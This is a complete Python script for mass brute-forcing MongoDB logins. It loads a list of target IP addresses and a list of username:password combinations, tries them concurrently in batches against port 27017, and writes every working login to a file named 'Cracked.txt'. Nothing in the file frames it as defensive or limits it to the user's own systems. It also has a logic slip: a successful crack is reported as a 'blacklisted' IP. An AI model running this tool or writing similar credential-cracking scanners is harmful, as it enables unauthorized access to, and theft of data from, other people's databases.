from motor.motor_asyncio import AsyncIOMotorClient
from pymongo import errors  # Import errors from pymongo
import sys
import asyncio
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
import aiofiles
console = Console()

async def load_target_ips(file_name):
    async with aiofiles.open(file_name, 'r') as file:
        return [line.strip() for line in await file.readlines() if line.strip()]

async def load_combos(file_name):
    async with aiofiles.open(file_name, 'r') as file:
        return [line.strip().split(':') for line in await file.readlines() if ':' in line]

async def scan_mongo(ip, username, password):
    try:
        client = AsyncIOMotorClient(f'mongodb://{username}:{password}@{ip}:27017/', 
                                    serverSelectionTimeoutMS=5000,
                                    connectTimeoutMS=5000)
        await client.server_info()
        return True, None
    except errors.ServerSelectionTimeoutError:
        return False, "Timeout"
    except errors.OperationFailure as e:
        return False, "AuthFail" if "Authentication failed" in str(e) else str(e)
    except Exception as e:
        error_msg = str(e)
        if "timeout" in error_msg.lower():
            return False, "Timeout"
        if "wire version" in error_msg.lower():
            return False, "WireVersionError"
        return False, "OtherError"

async def process_ip(ip, combos, progress, ip_task, combo_task):
    for i in range(0, len(combos), 20):  # Increased batch size
        batch = combos[i:i+20]
        tasks = [scan_mongo(ip, username, password) for username, password in batch]
        results = await asyncio.gather(*tasks)
        
        progress.update(combo_task, advance=len(batch))
        
        for (success, error), (username, password) in zip(results, batch):
            if success:
                console.print(f"[bold green][SUCCESS][/bold green] Found valid credentials for [cyan]{ip}[/cyan]: [yellow]{username}:{password}[/yellow]")
                async with aiofiles.open("Cracked.txt", "a") as good_file:
                    await good_file.write(f"{ip}:{username}:{password}\n")
                return True
            elif error in ["Timeout", "WireVersionError"]:
                console.print(f"[bold red][BLACKLIST][/bold red] {ip} ({error})")
                return False

    return False

async def main(ips_file, combos_file):
    ips = await load_target_ips(ips_file)
    combos = await load_combos(combos_file)
    total_ips = len(ips)
    total_combos = len(combos)

    console.print(f"Starting scan of {total_ips} IP addresses with {total_combos} credential combinations...")

    with Progress(
        SpinnerColumn(),
        "[progress.description]{task.description}",
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TextColumn("[progress.completed]{task.completed}/[progress.total]{task.total}"),
        console=console
    ) as progress:
        ip_task = progress.add_task("[bold cyan]IPs processed...", total=total_ips)
        combo_task = progress.add_task("[bold yellow]Combos tried for current IP...", total=total_combos)

        for ip in ips:
            progress.update(combo_task, completed=0)
            blacklisted = await process_ip(ip, combos, progress, ip_task, combo_task)
            progress.update(ip_task, advance=1)
            if blacklisted:
                console.print(f"[bold red]IP {ip} has been blacklisted. Moving to next IP.[/bold red]")

    console.print("Scan complete. Results saved to Cracked.txt.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        console.print("Usage: python script.py <ips_file.txt> <combos_file.txt>")
    else:
        asyncio.run(main(sys.argv[1], sys.argv[2]))
